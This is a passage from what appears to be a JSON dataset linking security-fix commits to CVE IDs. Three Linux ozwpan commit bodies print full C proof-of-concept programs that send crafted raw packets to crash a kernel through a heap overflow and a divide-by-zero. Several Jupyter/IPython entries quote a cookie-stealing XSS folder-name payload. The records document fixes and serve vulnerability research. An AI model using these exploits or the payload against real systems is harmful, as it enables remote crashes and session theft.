{perror(\"SIOCGIFINDEX\");return 1;}interface_index = if_idx.ifr_ifindex;if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {perror(\"SIOCGIFHWADDR\");return 1;}uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;struct {struct ether_header ether_header;struct oz_hdr oz_hdr;struct oz_elt oz_elt;struct oz_elt_connect_req oz_elt_connect_req;struct oz_elt oz_elt2;struct oz_multiple_fixed oz_multiple_fixed;} __packed packet = {.ether_header = {.ether_type = htons(OZ_ETHERTYPE),.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }},.oz_hdr = {.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),.last_pkt_num = 0,.pkt_num = htole32(0)},.oz_elt = {.type = OZ_ELT_CONNECT_REQ,.length = sizeof(struct oz_elt_connect_req)},.oz_elt_connect_req = {.mode = 0,.resv1 = {0},.pd_info = 0,.session_id = 0,.presleep = 0,.ms_isoc_latency = 0,.host_vendor = 0,.keep_alive = 0,.apps = htole16((1 << OZ_APPID_USB) | 0x1),.max_len_div16 = 0,.ms_per_isoc = 0,.up_audio_buf = 0,.ms_per_elt = 0},.oz_elt2 = {.type = OZ_ELT_APP_DATA,.length = sizeof(struct oz_multiple_fixed) - 3},.oz_multiple_fixed = {.app_id = OZ_APPID_USB,.elt_seq_num = 0,.type = OZ_USB_ENDPOINT_DATA,.endpoint = 0,.format = OZ_DATA_F_MULTIPLE_FIXED,.unit_size = 1,.data = {0}}};struct sockaddr_ll socket_address = {.sll_ifindex = interface_index,.sll_halen = ETH_ALEN,.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }};if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {perror(\"sendto\");return 1;}return 0;}Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>Acked-by: Dan Carpenter <dan.carpenter@oracle.com>Cc: stable <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2015-4002"
    ],
    "cveIdsCount": 1
  },
  "c075adf7126d860d77ce03d936cc793aa06b1eb0b4e19aeb4e4e6ef7ab62485f": {
    "url": "https://github.com/torvalds/linux/commit/d114b9fe78c8d6fc6e70808c2092aa307c36dc8e",
    "title": "ozwpan: Use proper check to prevent heap overflow",
    "body": "Since elt->length is a u8, we can make this variable a u8. Then we cando proper bounds checking more easily. Without this, a potentiallynegative value is passed to the memcpy inside oz_hcd_get_desc_cnf,resulting in a remotely exploitable heap overflow with networksupplied data.This could result in remote code execution. A PoC which obtains DoSfollows below. It requires the ozprotocol.h file from this module.=-=-=-=-=-= #include <arpa/inet.h> #include <linux/if_packet.h> #include <net/if.h> #include <netinet/ether.h> #include <stdio.h> #include <string.h> #include <stdlib.h> #include <endian.h> #include <sys/ioctl.h> #include <sys/socket.h> #define u8 uint8_t #define u16 uint16_t #define u32 uint32_t #define __packed __attribute__((__packed__)) #include \"ozprotocol.h\"static int hex2num(char c){if (c >= '0' && c <= '9')return c - '0';if (c >= 'a' && c <= 'f')return c - 'a' + 10;if (c >= 'A' && c <= 'F')return c - 'A' + 10;return -1;}static int hwaddr_aton(const char *txt, uint8_t *addr){int i;for (i = 0; i < 6; i++) {int a, b;a = hex2num(*txt++);if (a < 0)return -1;b = hex2num(*txt++);if (b < 0)return -1;*addr++ = (a << 4) | b;if (i < 5 && *txt++ != ':')return -1;}return 0;}int main(int argc, char *argv[]){if (argc < 3) {fprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);return 1;}uint8_t dest_mac[6];if (hwaddr_aton(argv[2], dest_mac)) {fprintf(stderr, \"Invalid mac address.\\n\");return 1;}int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);if (sockfd < 0) {perror(\"socket\");return 1;}struct ifreq if_idx;int interface_index;strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {perror(\"SIOCGIFINDEX\");return 1;}interface_index = if_idx.ifr_ifindex;if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {perror(\"SIOCGIFHWADDR\");return 1;}uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;struct {struct ether_header ether_header;struct oz_hdr oz_hdr;struct oz_elt oz_elt;struct oz_elt_connect_req oz_elt_connect_req;} __packed connect_packet = {.ether_header = {.ether_type = htons(OZ_ETHERTYPE),.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }},.oz_hdr = {.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),.last_pkt_num = 0,.pkt_num = htole32(0)},.oz_elt = {.type = OZ_ELT_CONNECT_REQ,.length = sizeof(struct oz_elt_connect_req)},.oz_elt_connect_req = {.mode = 0,.resv1 = {0},.pd_info = 0,.session_id = 0,.presleep = 35,.ms_isoc_latency = 0,.host_vendor = 0,.keep_alive = 0,.apps = htole16((1 << OZ_APPID_USB) | 0x1),.max_len_div16 = 0,.ms_per_isoc = 0,.up_audio_buf = 0,.ms_per_elt = 0}};struct {struct ether_header ether_header;struct oz_hdr oz_hdr;struct oz_elt oz_elt;struct oz_get_desc_rsp oz_get_desc_rsp;} __packed pwn_packet = {.ether_header = {.ether_type = htons(OZ_ETHERTYPE),.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }},.oz_hdr = {.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),.last_pkt_num = 0,.pkt_num = htole32(1)},.oz_elt = {.type = OZ_ELT_APP_DATA,.length = sizeof(struct oz_get_desc_rsp) - 2},.oz_get_desc_rsp = {.app_id = OZ_APPID_USB,.elt_seq_num = 0,.type = OZ_GET_DESC_RSP,.req_id = 0,.offset = htole16(0),.total_size = htole16(0),.rcode = 0,.data = {0}}};struct sockaddr_ll socket_address = {.sll_ifindex = interface_index,.sll_halen = ETH_ALEN,.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }};if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {perror(\"sendto\");return 1;}usleep(300000);if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {perror(\"sendto\");return 1;}return 0;}Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>Acked-by: Dan Carpenter <dan.carpenter@oracle.com>Cc: stable <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2015-4002"
    ],
    "cveIdsCount": 1
  },
  "f4e20588273be6d039af35271ef089ca03c31e801671c393ec5c8dfc914ccf45": {
    "url": "https://github.com/torvalds/linux/commit/04bf464a5dfd9ade0dda918e44366c2c61fce80b",
    "title": "ozwpan: divide-by-zero leading to panic",
    "body": "A network supplied parameter was not checked before division, leading toa divide-by-zero. Since this happens in the softirq path, it leads to acrash. A PoC follows below, which requires the ozprotocol.h file fromthis module.=-=-=-=-=-= #include <arpa/inet.h> #include <linux/if_packet.h> #include <net/if.h> #include <netinet/ether.h> #include <stdio.h> #include <string.h> #include <stdlib.h> #include <endian.h> #include <sys/ioctl.h> #include <sys/socket.h> #define u8 uint8_t #define u16 uint16_t #define u32 uint32_t #define __packed __attribute__((__packed__)) #include \"ozprotocol.h\"static int hex2num(char c){if (c >= '0' && c <= '9')return c - '0';if (c >= 'a' && c <= 'f')return c - 'a' + 10;if (c >= 'A' && c <= 'F')return c - 'A' + 10;return -1;}static int hwaddr_aton(const char *txt, uint8_t *addr){int i;for (i = 0; i < 6; i++) {int a, b;a = hex2num(*txt++);if (a < 0)return -1;b = hex2num(*txt++);if (b < 0)return -1;*addr++ = (a << 4) | b;if (i < 5 && *txt++ != ':')return -1;}return 0;}int main(int argc, char *argv[]){if (argc < 3) {fprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);return 1;}uint8_t dest_mac[6];if (hwaddr_aton(argv[2], dest_mac)) {fprintf(stderr, \"Invalid mac address.\\n\");return 1;}int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);if (sockfd < 0) {perror(\"socket\");return 1;}struct ifreq if_idx;int interface_index;strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {perror(\"SIOCGIFINDEX\");return 1;}interface_index = if_idx.ifr_ifindex;if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {perror(\"SIOCGIFHWADDR\");return 1;}uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;struct {struct ether_header ether_header;struct oz_hdr oz_hdr;struct oz_elt oz_elt;struct oz_elt_connect_req oz_elt_connect_req;struct oz_elt oz_elt2;struct oz_multiple_fixed oz_multiple_fixed;} __packed packet = {.ether_header = {.ether_type = htons(OZ_ETHERTYPE),.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }},.oz_hdr = {.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),.last_pkt_num = 0,.pkt_num = htole32(0)},.oz_elt = {.type = OZ_ELT_CONNECT_REQ,.length = sizeof(struct oz_elt_connect_req)},.oz_elt_connect_req = {.mode = 0,.resv1 = {0},.pd_info = 0,.session_id = 0,.presleep = 0,.ms_isoc_latency = 0,.host_vendor = 0,.keep_alive = 0,.apps = htole16((1 << OZ_APPID_USB) | 0x1),.max_len_div16 = 0,.ms_per_isoc = 0,.up_audio_buf = 0,.ms_per_elt = 0},.oz_elt2 = {.type = OZ_ELT_APP_DATA,.length = sizeof(struct oz_multiple_fixed)},.oz_multiple_fixed = {.app_id = OZ_APPID_USB,.elt_seq_num = 0,.type = OZ_USB_ENDPOINT_DATA,.endpoint = 0,.format = OZ_DATA_F_MULTIPLE_FIXED,.unit_size = 0,.data = {0}}};struct sockaddr_ll socket_address = {.sll_ifindex = interface_index,.sll_halen = ETH_ALEN,.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }};if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {perror(\"sendto\");return 1;}return 0;}Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>Acked-by: Dan Carpenter <dan.carpenter@oracle.com>Cc: stable <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2015-4003"
    ],
    "cveIdsCount": 1
  },
  "a4723d5b66b1f2a80a2251bb55151cfd776823cdefd9d7debb187ab193bc008b": {
    "url": "https://github.com/torvalds/linux/commit/59c816c1f24df0204e01851431d3bab3eb76719c",
    "title": "vhost/scsi: potential memory corruption",
    "body": "This code in vhost_scsi_make_tpg() is confusing because we limit \"tpgt\"to UINT_MAX but the data type of \"tpg->tport_tpgt\" and that is a u16.I looked at the context and it turns out that invhost_scsi_set_endpoint(), \"tpg->tport_tpgt\" is used as an offset intothe vs_tpg[] array which has VHOST_SCSI_MAX_TARGET (256) elements soanything higher than 255 then it is invalid. I have made that the limitnow.In vhost_scsi_send_evt() we mask away values higher than 255, but nowthat the limit has changed, we don't need the mask.Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>Signed-off-by: Nicholas Bellinger <nab@linux-iscsi.org>",
    "cveIds": [
      "CVE-2015-4036"
    ],
    "cveIdsCount": 1
  },
  "30d98418bd74e4d3008c7e98d6fc8b5a3194a757fb232884d80a33c955159674": {
    "url": "https://github.com/pixelb/coreutils/commit/bea5e36cc876ed627bb5e0eca36fdfaa6465e940",
    "title": "sort: fix buffer overflow with some case conversions",
    "body": "* src/sort.c (keycompare_mb): Ensure the buffer is big enoughto handle anything output from wctomb(). The current implementationis character based, so we allocate the worst case size for theconversion buffer, which is MB_CUR_MAX for each input byte.* tests/i18n/sort.sh: Add a test case causing seg fault.* tests/local.mk: Reference the new test case.Reported at https://bugzilla.suse.com/show_bug.cgi?id=928749",
    "cveIds": [
      "CVE-2015-4041",
      "CVE-2015-4042"
    ],
    "cveIdsCount": 2
  },
  "929b29e32e69582d387f9fa28f5cbc8511e49ea9e7e46132b949745080102fb9": {
    "url": "https://github.com/pgbouncer/pgbouncer/commit/edab5be6665b9e8de66c25ba527509b229468573",
    "title": "Check if auth_user is set.",
    "body": "Fixes a crash if password packet appears before startup packet (#42).",
    "cveIds": [
      "CVE-2015-4054"
    ],
    "cveIdsCount": 1
  },
  "ae0836cae12f74aaac03596bd1cddfc1122c0a58da3d903f4b8d3036f13d6d25": {
    "url": "https://github.com/pgbouncer/pgbouncer/commit/74d6e5f7de5ec736f71204b7b422af7380c19ac5",
    "title": "Check if auth_user is set.",
    "body": "Fixes a crash if password packet appears before startup packet (#42).",
    "cveIds": [
      "CVE-2015-4054"
    ],
    "cveIdsCount": 1
  },
  "4ac31f4749943275304d047b494c1af37f7542036f87572dc21581a00a32f9b2": {
    "url": "https://github.com/jborg/attic/commit/78f9ad1faba7193ca7f0acccbc13b1ff6ebf9072",
    "title": "Require approval before accessing previously unknown unencrypted repo…",
    "body": "…sitoriesCloses #271",
    "cveIds": [
      "CVE-2015-4082"
    ],
    "cveIdsCount": 1
  },
  "2add0b64ad96045e0dfb454b8318f24abd7265053e7113e60f3fa89f6361e8f9": {
    "url": "https://github.com/torvalds/linux/commit/23b133bdc452aa441fcb9b82cbf6dd05cfd342d0",
    "title": "udf: Check length of extended attributes and allocation descriptors",
    "body": "Check length of extended attributes and allocation descriptors whenloading inodes from disk. Otherwise corrupted filesystems could confusethe code and make the kernel oops.Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no>CC: stable@vger.kernel.orgSigned-off-by: Jan Kara <jack@suse.cz>",
    "cveIds": [
      "CVE-2015-4167"
    ],
    "cveIdsCount": 1
  },
  "b03d9564829461332e2141d8752ee08f29a8e0937222e66fdefe615f1c865190": {
    "url": "https://github.com/torvalds/linux/commit/e0c9c0afd2fc958ffa34b697972721d81df8a56f",
    "title": "mnt: Update detach_mounts to leave mounts connected",
    "body": "Now that it is possible to lazily unmount an entire mount tree andleave the individual mounts connected to each other add a new flagUMOUNT_CONNECTED to umount_tree to force this behavior and usethis flag in detach_mounts.This closes a bug where the deletion of a file or directory couldtrigger an unmount and reveal data under a mount point.Cc: stable@vger.kernel.orgSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>",
    "cveIds": [
      "CVE-2015-4176"
    ],
    "cveIdsCount": 1
  },
  "0392019a27d6679620e0d14d6a78209a5c7ba18165bf620622eb93777608c63f": {
    "url": "https://github.com/mongoid/moped/commit/dd5a7c14b5d2e466f7875d079af71ad19774609b#diff-3b93602f64c2fe46d38efd9f73ef5358R24",
    "title": "Merge Replica Set Refactor",
    "body": "* Removes Server, and Socket; replaced with Node, and Connection. Replica sets are now much more robustly supported, including failover and discovery.* Refactors specs. Internal APIs are now tested with integration specs through the public APIs.* More documentation.",
    "cveIds": [
      "CVE-2015-4410"
    ],
    "cveIdsCount": 1
  },
  "13053879ad775179ba48e0230d8698864deb2e7bb008dae7b6a486626e388377": {
    "url": "https://github.com/pimcore/pimcore/commit/4f2a95f877d406a054f9f2253475fe58c76aa03d",
    "title": "AssetController: directory traversal vulnerability issue",
    "body": "git-svn-id: http://www.pimcore.org/svn/pimcore/private/core/trunk@6458 1f8fe7d8-47f0-464c-8d0a-336f4953ab05",
    "cveIds": [
      "CVE-2015-4425"
    ],
    "cveIdsCount": 1
  },
  "4bce1dcbf8b881a659e737652613e9fd87875b0fa9a8f23f9dcd9536cf45b9c3": {
    "url": "https://github.com/pimcore/pimcore/commit/1c6692e8287deed7f3356b6a1e2e9b7fe4e858dd",
    "title": "fixed sql injection issue",
    "body": "git-svn-id: http://www.pimcore.org/svn/pimcore/private/core/trunk@6460 1f8fe7d8-47f0-464c-8d0a-336f4953ab05",
    "cveIds": [
      "CVE-2015-4426"
    ],
    "cveIdsCount": 1
  },
  "7aec0a3b4f2b2680d2b8884293e71cfcf01d84726af063316153f353f0278927": {
    "url": "https://github.com/kyz/libmspack/commit/18b6a2cc0b87536015bedd4f7763e6b02d5aa4f3",
    "title": "Prevent a 1-byte underread of the input buffer if an odd-sized data b…",
    "body": "…lock comes just before an uncompressed block header",
    "cveIds": [
      "CVE-2015-4471"
    ],
    "cveIdsCount": 1
  },
  "a31af70dd9ff736aa829760483ba6753b5515ad4888d020ac20b7a64f1834fda": {
    "url": "https://github.com/LimeSurvey/LimeSurvey/commit/b09edc0dbd18d8459ade4c7c941e562c16564f9e",
    "title": "Fixed issue: SQL injection vulnerability in administration - discover…",
    "body": "…ed by 0keeTeam / QIHU 360 company, China",
    "cveIds": [
      "CVE-2015-4628"
    ],
    "cveIdsCount": 1
  },
  "40342069da88e0e7d19cf042455d8f168a6aa0c7a0e074b5367df57e390ccb16": {
    "url": "https://github.com/plougher/squashfs-tools/commit/f95864afe8833fe3ad782d714b41378e860977b1",
    "title": "unsquashfs-4: Add more sanity checks + fix CVE-2015-4645/6",
    "body": "Add more filesystem table sanity checks to Unsquashfs-4 andalso properly fix CVE-2015-4645 and CVE-2015-4646.The CVEs were raised due to Unsquashfs having variableoveflow and stack overflow in a number of vulnerablefunctions.The suggested patch only \"fixed\" one such function and fixedit badly, and so it was buggy and introduced extra bugs!The suggested patch was not only buggy, but, it used theessentially wrong approach too. It was \"fixing\" thesymptom but not the cause. The symptom is wrong valuescausing overflow, the cause is filesystem corruption.This corruption should be detected and the filesystemrejected *before* trying to allocate memory.This patch applies the following fixes:1. The filesystem super-block tables are checked, and the values must match across the filesystem. This will trap corrupted filesystems created by Mksquashfs.2. The maximum (theorectical) size the filesystem tables could grow to, were analysed, and some variables were increased from int to long long. This analysis has been added as comments.3. Stack allocation was removed, and a shared buffer (which is checked and increased as necessary) is used to read the table indexes.Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>",
    "cveIds": [
      "CVE-2015-4645"
    ],
    "cveIdsCount": 1
  },
  "7b03c68ec6f1551d1c80757f44fa53655b31312e1c7e122c9b5b58c5ade62bdc": {
    "url": "https://github.com/WordPress/WordPress/commit/9c57f3a4291f2311ae05f22c10eedeb0f69337ab",
    "title": "XMLRPC: Don't allow private posts to be sticky.",
    "body": "Merge of [34135] to the 4.3 branch.See #20662.Built from https://develop.svn.wordpress.org/branches/4.3@34151git-svn-id: http://core.svn.wordpress.org/branches/4.3@34119 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2015-5715"
    ],
    "cveIdsCount": 1
  },
  "f2f21dc64adae0508975add54aa86473839bb5dfa131fc7b66d9bd2c64dfc1d5": {
    "url": "https://github.com/MISP/MISP/commit/415d85102d5aa5f96f4f11a17c86b59bb9cc0d56",
    "title": "Security fix: Fix to a possible PHP Object injection",
    "body": "- unserialized user input replaced with json_decode",
    "cveIds": [
      "CVE-2015-5721"
    ],
    "cveIdsCount": 1
  },
  "1aef5bcf82b371443b3a415a2c595939409aaed46848c17a9d2cdcd24c2846c2": {
    "url": "https://github.com/Froxlor/Froxlor/commit/8558533a9148a2a0302c9c177abff8e4e4075b92",
    "title": "replace passwords even before logging, not just for display",
    "body": "Signed-off-by: Michael Kaufmann (d00p) <d00p@froxlor.org>",
    "cveIds": [
      "CVE-2015-5959"
    ],
    "cveIdsCount": 1
  },
  "445bc13acf718957b021b5ea9ee68666adddc9d6e12683785c08f69ff4427d00": {
    "url": "https://github.com/claviska/simple-php-captcha/commit/9d65a945029c7be7bb6bc893759e74c5636be694",
    "title": "Merge pull request #17 from ALSchwalm/master",
    "body": "Switch from rand to mt_rand",
    "cveIds": [
      "CVE-2015-6250"
    ],
    "cveIdsCount": 1
  },
  "6d8be544ec6af69884f94b7d1517658a8554d913d8255521e38f1578d3509577": {
    "url": "https://github.com/torvalds/linux/commit/7932c0bd7740f4cd2aa168d3ce0199e7af7d72d5",
    "title": "vhost: actually track log eventfd file",
    "body": "While reviewing vhost log code, I found out that log_file is neverset. Note: I haven't tested the change (QEMU doesn't use LOG_FD yet).Cc: stable@vger.kernel.orgSigned-off-by: Marc-André Lureau <marcandre.lureau@redhat.com>Signed-off-by: Michael S. Tsirkin <mst@redhat.com>",
    "cveIds": [
      "CVE-2015-6252"
    ],
    "cveIdsCount": 1
  },
  "215db44b0cfb673538a107def4fdaf2b6e213229b8be7d93d2cfdf32c2742254": {
    "url": "https://github.com/bestpractical/rt/commit/36a461947b00b105336adb4997d",
    "title": "Escape message crypt status as we insert it into the DOM",
    "body": "The ->{'Value'} part of each message is inserted into the DOM with noescaping (to accommodate MakeClicky and callbacks using HTML). Values RTreceives from other systems must be escaped or they leave us vulnerable toan XSS injection attack.This also happens to fix a bug where email addresses of senders would insome cases not be shown in the browser.",
    "cveIds": [
      "CVE-2015-6506"
    ],
    "cveIdsCount": 1
  },
  "6787c6ec70cb325b6a294471cb9514b8245b3693afb99f9b94e5ba3e10702974": {
    "url": "https://github.com/tillkamppeter/ippusbxd/commit/46844402bca7a38fc224483ba6f0a93c4613203f",
    "title": "SECURITY FIX: Actually restrict the access to the printer to localhost",
    "body": "Before, any machine in any network connected by any of the interfaces (aslisted by \"ifconfig\") could access to an IPP-over-USB printer on the assignedport, allowing users on remote machines to print and to access the webconfiguration interface of a IPP-over-USB printer in contrary to conventionalUSB printers which are only accessible locally.",
    "cveIds": [
      "CVE-2015-6520"
    ],
    "cveIdsCount": 1
  },
  "e4ee225a04999472d82d8007ccaf03f68275a733516b6705d5ec36d25a821530": {
    "url": "https://github.com/torvalds/linux/commit/9a5cbce421a283e6aea3c4007f141735bf9da8c3",
    "title": "powerpc/perf: Cap 64bit userspace backtraces to PERF_MAX_STACK_DEPTH",
    "body": "We cap 32bit userspace backtraces to PERF_MAX_STACK_DEPTH(currently 127), but we forgot to do the same for 64bit backtraces.Cc: stable@vger.kernel.orgSigned-off-by: Anton Blanchard <anton@samba.org>Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>",
    "cveIds": [
      "CVE-2015-6526"
    ],
    "cveIdsCount": 1
  },
  "d3e93cd8579245aad100e4cf606122e73edb1ee49045c6276ec88743d5895efd": {
    "url": "https://github.com/wgm/cerb/commit/12de87ff9961a4f3ad2946c8f47dd0c260607144",
    "title": "* [Security/CSRF] Fixed a medium risk CSRF (cross-site request forger…",
    "body": "…y) vulnerability reported by High-Tech Bridge (HTB23269). We don't have any evidence of this having taken place in the wild, but we were able to reproduce the results with the proof-of-concept in the advisory. A logged in worker could be tricked into visiting a URL that could perform certain actions in their browser session. Cerb now uses the Synchronizer pattern: a session-based token included with every HTML FORM and Ajax request that is compared to the active session. This verifies that such requests are coming from an existing Cerb page rather than an external source. When a potential CSRF attack is detected, the event is now logged in the PHP log as a warning.",
    "cveIds": [
      "CVE-2015-6545"
    ],
    "cveIdsCount": 1
  },
  "7aefd23c34693f62764fa716938643159768469a56106e10570475b21b061be1": {
    "url": "https://github.com/openssh/openssh-portable/commit/d4697fe9a28dab7255c60433e4dd23cf7fce8a8b",
    "title": "Don't resend username to PAM; it already has it.",
    "body": "Pointed out by Moritz Jodeit; ok dtucker@",
    "cveIds": [
      "CVE-2015-6563"
    ],
    "cveIdsCount": 1
  },
  "59e84766214639bc852d16ae41d2338219ac6b9a0a7ec44732d3b30d75910018": {
    "url": "https://github.com/openssh/openssh-portable/commit/5e75f5198769056089fb06c4d738ab0e5abc66f7",
    "title": "set sshpam_ctxt to NULL after free",
    "body": "Avoids use-after-free in monitor when privsep child is compromised.Reported by Moritz Jodeit; ok dtucker@",
    "cveIds": [
      "CVE-2015-6564"
    ],
    "cveIdsCount": 1
  },
  "88744239474cea09ce16483a006d65f4204e99cbf640c2eaa1a56dba7928009e": {
    "url": "https://github.com/wikimedia/mediawiki/commit/5faabfa1bbf65536ea36108887040198afcb3c82",
    "title": "SECURITY: Don't disclose if an IP is autoblocked on Special:DeletedCo…",
    "body": "…ntributionsSame patch as dc2966b, just for Special:DeletedContributions thistime.Bug: T106893Change-Id: I2089b21fc379b612fe9bf087b5f4ea75052bdbd3",
    "cveIds": [
      "CVE-2015-6727"
    ],
    "cveIdsCount": 1
  },
  "d1422b6ae8b62301a8af4e33a9b1e2632e9f2a5bfe7837a39e3f08744429fb03": {
    "url": "https://github.com/googlei18n/sfntly/commit/de776d4ef06ca29c240de3444348894f032b03ff",
    "title": "Check for integer overflow in sfntly::FontData::Bound().",
    "body": "Also delete dead code and cleanup some nits.This is cl/96914065.",
    "cveIds": [
      "CVE-2015-6781"
    ],
    "cveIdsCount": 1
  },
  "352cf5f110e6522cb0f836602b6ca659149953a3d54fd6233fa2850e54e0dea5": {
    "url": "https://github.com/pgbouncer/pgbouncer/commit/7ca3e5279d05fceb1e8a043c6f5b6f58dea3ed38",
    "title": "Remove too early set of auth_user",
    "body": "When query returns 0 rows (user not found),this user stays as login user...Should fix #69.",
    "cveIds": [
      "CVE-2015-6817"
    ],
    "cveIdsCount": 1
  },
  "f57e6f029722fd9712095f8480d6c89d4752478c3ecb163ba161f21db9feda0a": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/785f4e2711848eb8945894199d5870253a88584e",
    "title": "Fix reCaptcha bypass",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2015-6830"
    ],
    "cveIdsCount": 1
  },
  "5666e0408724b5a2046c5fb618fe40e9665c59dd730734f0269db152f0fd1fd1": {
    "url": "https://github.com/saltstack/salt/commit/28aa9b105804ff433d8f663b2f9b804f2b75495a",
    "title": "Merge pull request #26486 from thusoy/git-confidential-auth",
    "body": "Git: Don't leak https user/pw to log",
    "cveIds": [
      "CVE-2015-6918"
    ],
    "cveIdsCount": 1
  },
  "689ca51326d0e2075b27deb3b6376378cde7ce694e4cd0070bb728fad16c8bff": {
    "url": "https://github.com/jupyter/notebook/commit/35f32dd2da804d108a3a3585b69ec3295b2677ed",
    "title": "Fix XSS reported on Security list",
    "body": "No CVE-ID yetAugust 18, 2015-----Reported to Quantopian by Juan Broullón <thebrowfc@gmail.com>...If you create a new folder in the iPython file browser and setJavascript code as its name the code injected will be executed. So, if Icreate a folder called \"><img src=x onerror=alert(document.cookie)> andthen I access to it, the cookies will be prompted.The XSS code is also executed if you access a link pointing directly atthe folder. jik------",
    "cveIds": [
      "CVE-2015-6938"
    ],
    "cveIdsCount": 1
  },
  "ac13c457e985d3cfc556853e52b0bc5c2f04ce592087394e28d1cc405bcbbf01": {
    "url": "https://github.com/ipython/ipython/commit/3ab41641cf6fce3860c73d5cf4645aa12e1e5892",
    "title": "Fix XSS reported on Security list",
    "body": "No CVE-ID yetAugust 18, 2015-----Reported to Quantopian by Juan Broullón <thebrowfc@gmail.com>...If you create a new folder in the iPython file browser and setJavascript code as its name the code injected will be executed. So, if Icreate a folder called \"><img src=x onerror=alert(document.cookie)> andthen I access to it, the cookies will be prompted.The XSS code is also executed if you access a link pointing directly atthe folder. jik------",
    "cveIds": [
      "CVE-2015-6938"
    ],
    "cveIdsCount": 1
  },
  "c7fbd313f290bdc1d0ea481e4774cd53864e5d2cf676b26894370790f20551db": {
    "url": "https://github.com/jupyter/notebook/commit/dd9876381f0ef09873d8c5f6f2063269172331e3",
    "title": "Fix XSS reported on Security list",
    "body": "No CVE-ID yetAugust 18, 2015-----Reported to Quantopian by Juan Broullón <thebrowfc@gmail.com>...If you create a new folder in the iPython file browser and setJavascript code as its name the code injected will be executed. So, if Icreate a folder called \"><img src=x onerror=alert(document.cookie)> andthen I access to it, the cookies will be prompted.The XSS code is also executed if you access a link pointing directly atthe folder. jik------",
    "cveIds": [
      "CVE-2015-6938"
    ],
    "cveIdsCount": 1
  },
  "6c1593c2270d802ee9e7e5b143dda8b748c820a12ca2a455cf011c0d27256b14": {
    "url": "https://github.com/plone/Products.CMFPlone/commit/3da710a2cd68587f0bf34f2e7ea1167d6eeee087",
    "title": "Merge pull request #914 from plone/isURLInPortal-hotfix",
    "body": "Apply isURLInPortal fix from https://pypi.python.org/pypi/Products.PloneHotfix20150910",
    "cveIds": [
      "CVE-2015-7316"
    ],
    "cveIdsCount": 1
  },
  "4837f5b1105692b041430f50cedc3a1ab77dbeaae8c3d02247d1e93f664923df": {
    "url": "https://github.com/revive-adserver/revive-adserver/commit/288f81cc",
    "title": "Fix CVE-2015-7364",
